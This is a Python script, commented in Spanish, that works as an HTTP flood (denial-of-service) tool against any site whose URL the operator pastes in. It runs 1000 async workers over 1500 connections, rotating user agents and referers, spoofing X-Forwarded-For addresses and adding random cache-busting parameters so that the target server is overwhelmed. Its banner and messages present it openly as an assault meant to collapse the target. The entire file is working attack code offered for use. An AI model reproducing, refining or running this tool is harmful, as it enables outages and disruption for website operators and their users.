import asyncio
import aiohttp
import random
import os
import sys
import time
from colorama import Fore, Style, init

init()

# BASE DE DATOS DE CABECERAS PARA PENETRACIÓN DE FIREWALLS
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

REF = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://t.co/"]

def banner():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("████████████████████████████████████████████████████████████")
    print("█   SISTEMA DE ASALTO TOTAL: ELISANDRO-ULTIMATE v4.0       █")
    print("█   VECTORES: FLOOD + BYPASS + MEMORY EXHAUSTION           █")
    print("████████████████████████████████████████████████████████████")
    print(f"{Style.RESET_ALL}")

async def send_payload(url, session, worker_id):
    """
    Función de ataque de alto impacto con bypass de caché y rotación.
    """
    count = 0
    while True:
        try:
            # Bypass de caché dinámico para forzar procesamiento del servidor
            params = {
                'id': random.randint(1, 1000000),
                'user': f"hacker_{random.randint(1, 9999)}",
                'token': hex(random.getrandbits(64))
            }
            
            headers = {
                'User-Agent': random.choice(UAS),
                'Referer': random.choice(REF),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive'
            }

            # DISPARO ASÍNCRONO SIN ESPERA (FIRE AND FORGET)
            async with session.get(url, headers=headers, params=params, timeout=1.5) as response:
                count += 1
                if count % 200 == 0:
                    print(f"{Fore.MAGENTA}[ULTIMATE-{worker_id}]{Fore.WHITE} -> Ráfaga de 200 impactos enviada.")
        except:
            # Si el servidor no responde, aumentamos la presión
            pass

async def main():
    banner()
    
    # APARTADO PARA PEGAR EL ENLACE DEL CÓDIGO / URL
    print(f"{Fore.CYAN}--- PANEL DE CONTROL ---{Style.RESET_ALL}")
    url = input(f"{Fore.YELLOW}PEGAR AQUÍ EL ENLACE DEL SITIO OBJETIVO: {Style.RESET_ALL}").strip()
    
    if not url.startswith("http"):
        print(f"{Fore.RED}[!] ERROR: La URL debe comenzar con http:// o https://")
        return

    print(f"\n{Fore.GREEN}[⚡] DESPLEGANDO UN MILLÓN DE SOLICITUDES EN RÁFAGA...")
    print(f"{Fore.RED}[!] EL SERVIDOR OBJETIVO ENTRARÁ EN COLAPSO CRÍTICO EN SEGUNDOS...{Style.RESET_ALL}")
    
    # Pool de 1500 conexiones concurrentes (Máximo rendimiento para Termux)
    connector = aiohttp.TCPConnector(limit=1500, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        # Lanzamos 1000 trabajadores asíncronos para saturar el ancho de banda
        for i in range(1000):
            tasks.append(send_payload(url, session, i))
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ATAQUE DETENIDO POR EL OPERADOR.{Style.RESET_ALL}")
